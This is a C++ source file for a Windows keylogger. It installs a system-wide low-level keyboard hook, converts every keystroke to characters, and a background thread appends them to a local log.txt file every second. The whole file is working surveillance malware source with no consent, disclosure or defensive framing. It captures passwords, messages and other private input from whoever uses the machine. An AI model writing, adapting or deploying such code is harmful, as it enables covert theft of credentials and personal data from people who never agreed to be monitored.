#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>
#include <ctime>
#include <thread>
#include <mutex>

std::mutex mtx;

void save_log(const std::string &filename, const std::string &buffer)
{
    std::lock_guard<std::mutex> lock(mtx);
    std::ofstream log_file(filename, std::ios_base::app | std::ios_base::binary);
    log_file.write(buffer.c_str(), buffer.size());
    log_file.close();
}

bool is_valid_key(int vk)
{
    return (vk >= 0x30 && vk <= 0x39) || // 0-9
           (vk >= 0x41 && vk <= 0x5A) || // A-Z
           (vk >= 0x60 && vk <= 0x69) || // NumPad 0-9
           (vk >= 0x6A && vk <= 0x6F) || // NumPad Operators
           (vk >= 0xBA && vk <= 0xC0) || // Punctuation
           (vk >= 0xDB && vk <= 0xDF) || // Brackets and Pipe
           (vk == VK_RETURN) ||          // Enter key
           (vk == VK_SPACE) ||           // Space key
           (vk == VK_BACK) ||            // Backspace key
           (vk == VK_TAB) ||             // Tab key
           (vk == VK_LCONTROL) ||        // Left Control key
           (vk == VK_RCONTROL) ||        // Right Control key
           (vk == VK_LSHIFT) ||          // Left Shift key
           (vk == VK_RSHIFT) ||          // Right Shift key
           (vk == VK_LMENU) ||           // Left Menu key
           (vk == VK_RMENU) ||           // Right Menu key
           (vk == VK_CAPITAL) ||         // Caps Lock key
           (vk == VK_NUMLOCK) ||         // Num Lock key
           (vk == VK_SCROLL);            // Scroll Lock key
}

void save_buffer(const std::string &filename, int interval, std::string &buffer)
{
    while (true)
    {
        std::this_thread::sleep_for(std::chrono::seconds(interval));
        if (!buffer.empty())
        {
            save_log(filename, buffer);
            buffer.clear();
        }
    }
}

LRESULT CALLBACK low_level_keyboard_proc(int nCode, WPARAM wParam, LPARAM lParam, std::string &buffer)
{
    if (nCode >= 0 && wParam == WM_KEYDOWN)
    {
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lParam;
        int vk = kb->vkCode;

        if (is_valid_key(vk))
        {
            char key;
            bool shift_pressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
            bool caps_lock_on = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

            BYTE keyboard_state[256];
            GetKeyboardState(keyboard_state);

            WCHAR unicode_char;
            if (ToUnicode(vk, kb->scanCode, keyboard_state, &unicode_char, 1, 0) == 1)
            {
                key = static_cast<char>(unicode_char);

                if (!(shift_pressed ^ caps_lock_on) && isalpha(key))
                {
                    key = tolower(key);
                }
            }
            else
            {
                key = '\0';
            }

            if (key)
            {
                std::lock_guard<std::mutex> lock(mtx);
                buffer.push_back(key);
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

std::string buffer;

LRESULT CALLBACK hook_proc(int nCode, WPARAM wParam, LPARAM lParam)
{
    return low_level_keyboard_proc(nCode, wParam, lParam, buffer);
}

void keylogger(const std::string &filename = "log.txt", int interval = 1)
{
    buffer.reserve(1024);

    std::thread saver_thread(save_buffer, filename, interval, std::ref(buffer));
    saver_thread.detach();

    HHOOK h_hook = SetWindowsHookEx(WH_KEYBOARD_LL, hook_proc, NULL, 0);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}
